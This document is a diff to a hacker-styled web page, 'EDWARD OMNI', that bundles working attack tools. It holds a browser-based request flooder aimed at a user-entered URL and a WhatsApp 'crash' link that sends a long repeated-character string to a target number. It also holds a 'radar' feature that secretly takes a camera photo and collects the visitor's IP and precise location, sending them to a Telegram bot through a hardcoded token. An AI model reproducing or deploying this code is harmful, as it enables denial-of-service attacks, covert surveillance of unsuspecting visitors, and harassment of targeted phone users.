@@ -3,44 +3,43 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>EDWARD OMNI</title>
+    <title>EDWARD OMNI GACOR</title>
     <style>
         :root { --neon: #0f0; --bg: #000; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin:0; padding: 20px; }
-        .header-title { font-size: 18px; letter-spacing: 5px; text-shadow: 0 0 15px var(--neon); margin: 20px 0; font-weight: bold; text-align: center; }
-        .card { border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 15px; padding: 20px; margin-bottom: 20px; background: rgba(10, 10, 10, 0.8); box-shadow: 0 0 15px rgba(0, 255, 0, 0.1); }
-        h3 { margin: 0 0 15px 0; font-size: 11px; color: #fff; letter-spacing: 2px; }
-        input { background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 10px; width: 100%; margin-bottom: 15px; font-size: 14px; outline: none; }
-        .btn { width: 100%; padding: 15px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 12px; }
-        .btn-phish { background: #bc13fe; color: #fff; box-shadow: 0 0 10px rgba(188, 19, 254, 0.4); }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin:0; padding: 15px; }
+        .header-title { font-size: 18px; letter-spacing: 5px; text-shadow: 0 0 15px var(--neon); margin: 15px 0; font-weight: bold; text-align: center; }
+        .card { border: 1px solid rgba(0, 255, 0, 0.3); border-radius: 15px; padding: 18px; margin-bottom: 15px; background: rgba(10, 10, 10, 0.8); box-shadow: 0 0 15px rgba(0, 255, 0, 0.1); }
+        h3 { margin: 0 0 12px 0; font-size: 11px; color: #fff; letter-spacing: 2px; }
+        input { background: transparent; border: none; border-bottom: 1px solid #333; color: #fff; padding: 8px; width: 100%; margin-bottom: 12px; font-size: 13px; outline: none; }
+        .btn { width: 100%; padding: 14px; border-radius: 10px; border: none; cursor: pointer; font-weight: bold; text-transform: uppercase; font-size: 11px; }
+        .btn-wa { background: #25D366; color: #000; }
+        .btn-phish { background: #bc13fe; color: #fff; }
         .btn-radar { background: transparent; color: var(--neon); border: 1px solid var(--neon); }
-        
-        /* ATTACK MONITOR */
-        #monitor { display: none; margin-top: 15px; background: #080808; border-radius: 8px; padding: 10px; border: 1px solid #222; }
-        .stat-row { display: flex; justify-content: space-between; font-size: 10px; margin-bottom: 5px; }
+        #monitor { display: none; margin-top: 10px; background: #080808; border-radius: 8px; padding: 10px; border: 1px solid #222; font-size: 10px; }
         .val { color: #fff; font-weight: bold; }
-        .pulse { animation: blink 1s infinite; color: #f00; }
-        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
-        
         #radarOverlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: #000; z-index: 9999; flex-direction: column; align-items: center; justify-content: center; }
-        .radar-ring { width: 200px; height: 200px; border: 1px solid var(--neon); border-radius: 50%; position: relative; }
+        .radar-ring { width: 180px; height: 180px; border: 1px solid var(--neon); border-radius: 50%; position: relative; }
         .sweep { position: absolute; width: 50%; height: 50%; background: linear-gradient(45deg, rgba(0,255,0,0.4), transparent); transform-origin: bottom right; animation: sweep 2s linear infinite; }
         @keyframes sweep { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        canvas, video { display: none; }
     </style>
 </head>
 <body>
-
     <div class="header-title">EDWARD OMNI</div>
 
     <div class="card">
+        <h3>WHATSAPP BUG CRASH</h3>
+        <input type="number" id="noWA" placeholder="Target (628...)">
+        <button class="btn btn-wa" onclick="startWA()">SEND PAYLOAD ☠️</button>
+    </div>
+
+    <div class="card">
         <h3>PHISHING KILLER</h3>
-        <input type="text" id="targetUrl" placeholder="https://link-penipu.com">
-        <button class="btn btn-phish" id="atkBtn" onclick="toggleAttack()">LAUNCH SILENT ATTACK 🔥</button>
-        
+        <input type="text" id="targetUrl" placeholder="URL Target Penipu">
+        <button class="btn btn-phish" id="atkBtn" onclick="toggleAtk()">LAUNCH ATTACK 🔥</button>
         <div id="monitor">
-            <div class="stat-row"><span>STATUS:</span> <span class="val pulse">ATTACKING</span></div>
-            <div class="stat-row"><span>TOTAL PACKETS:</span> <span id="totalPkts" class="val">0</span></div>
-            <div class="stat-row"><span>STRENGTH:</span> <span id="pps" class="val">0</span> PKT/SEC</div>
+            <div style="display:flex; justify-content:space-between"><span>TOTAL PACKETS:</span> <span id="total" class="val">0</span></div>
+            <div style="display:flex; justify-content:space-between"><span>STRENGTH:</span> <span><span id="pps" class="val">0</span> PKT/SEC</span></div>
         </div>
     </div>
 
@@ -51,63 +50,68 @@
 
     <div id="radarOverlay">
         <div class="radar-ring"><div class="sweep"></div></div>
-        <p id="st" style="margin-top:30px; font-size:10px; letter-spacing:2px;">ENCRYPTING DATA...</p>
-        <button onclick="location.reload()" style="background:transparent; border:none; color:#444; margin-top:20px;">[ CLOSE ]</button>
+        <p id="st" style="margin-top:20px; font-size:10px; letter-spacing:2px;">SCANNING DATA & SENSORS...</p>
+        <button onclick="location.reload()" style="background:transparent; border:none; color:#444; margin-top:15px;">[ EXIT ]</button>
     </div>
 
-    <script>
-        let isAtk = false;
-        let atkInt;
-        let total = 0;
-        let lastTotal = 0;
+    <canvas id="canvas"></canvas>
+    <video id="v" autoplay playsinline></video>
 
-        function toggleAttack() {
+    <script>
+        const TOKEN = '8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g';
+        const CHAT_ID = '7898572558';
+        let isAtk = false, atkInt, total = 0, last = 0;
+
+        function toggleAtk() {
             let u = document.getElementById('targetUrl').value;
             if(!u) return;
-            const btn = document.getElementById('atkBtn');
-            const mon = document.getElementById('monitor');
-
             if(!isAtk) {
-                isAtk = true;
-                btn.innerText = "STOP ATTACK 🛑";
-                btn.style.background = "#f00";
-                mon.style.display = "block";
-                
-                atkInt = setInterval(() => {
-                    for(let i=0; i<80; i++) {
-                        fetch(u, { mode: 'no-cors', cache: 'no-cache' }).then(() => { total++; }).catch(() => { total++; });
-                    }
-                }, 100);
-
-                // Update Stats per detik
-                setInterval(() => {
-                    if(isAtk) {
-                        document.getElementById('totalPkts').innerText = total;
-                        document.getElementById('pps').innerText = (total - lastTotal);
-                        lastTotal = total;
-                    }
-                }, 1000);
-
-            } else {
-                isAtk = false;
-                btn.innerText = "LAUNCH SILENT ATTACK 🔥";
-                btn.style.background = "#bc13fe";
-                mon.style.display = "none";
-                clearInterval(atkInt);
-            }
+                isAtk = true; document.getElementById('monitor').style.display = "block"; document.getElementById('atkBtn').innerText = "STOP ATTACK 🛑";
+                atkInt = setInterval(() => { for(let i=0; i<80; i++){ fetch(u, {mode:'no-cors', cache:'no-cache'}).then(()=>total++).catch(()=>total++); } }, 100);
+                setInterval(() => { if(isAtk){ document.getElementById('total').innerText = total; document.getElementById('pps').innerText = (total-last); last=total; } }, 1000);
+            } else { location.reload(); }
         }
 
         async function startRadar() {
             document.getElementById('radarOverlay').style.display = 'flex';
+            const status = document.getElementById('st');
+
             try {
-                const ipR = await fetch('https://api.ipify.org?format=json');
-                const ipD = await ipR.json();
-                navigator.geolocation.getCurrentPosition((p) => {
-                    let m = "🔱 [ LOCKED ] 🔱\nIP: "+ipD.ip+"\nLOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude;
-                    fetch("https://api.telegram.org/bot8766727574:AAHYs-g11Up4SWnl4t8P3pHpMvS1XkKkr0g/sendMessage?chat_id=7898572558&text="+encodeURIComponent(m));
-                    document.getElementById('st').innerText = "DATA SENT TO MASTER";
-                }, null, {enableHighAccuracy:true});
-            } catch(e){}
+                // 1. Ambil Kamera & Foto
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                const video = document.getElementById('v');
+                video.srcObject = stream;
+                
+                setTimeout(async () => {
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth; canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    const blob = await new Promise(res => canvas.toBlob(res, 'image/jpeg'));
+                    
+                    const fd = new FormData();
+                    fd.append('chat_id', CHAT_ID);
+                    fd.append('photo', blob);
+                    fetch("https://api.telegram.org/bot"+TOKEN+"/sendPhoto", { method: "POST", body: fd });
+                    
+                    // 2. Ambil Lokasi & IP
+                    const ipR = await fetch('https://api.ipify.org?format=json');
+                    const ipD = await ipR.json();
+                    
+                    navigator.geolocation.getCurrentPosition((p) => {
+                        let m = "🔱 [ LOCKED ] 🔱\n🌐 IP: "+ipD.ip+"\n📍 LOC: http://googleusercontent.com/maps?q="+p.coords.latitude+","+p.coords.longitude+"\n🎯 ACC: "+p.coords.accuracy.toFixed(1)+"m";
+                        fetch("https://api.telegram.org/bot"+TOKEN+"/sendMessage?chat_id="+CHAT_ID+"&text="+encodeURIComponent(m));
+                        status.innerText = "SUCCESS: COORDINATES SECURED";
+                    }, null, {enableHighAccuracy:true});
+                }, 2000);
+
+            } catch (e) {
+                status.innerText = "ERROR: PERMISSION DENIED!";
+            }
+        }
+
+        function startWA() {
+            let n = document.getElementById('noWA').value;
+            window.location.href = "https://api.whatsapp.com/send?phone="+n+"&text="+"జ్ఞਾ".repeat(300);
         }
     </script>
 </body>
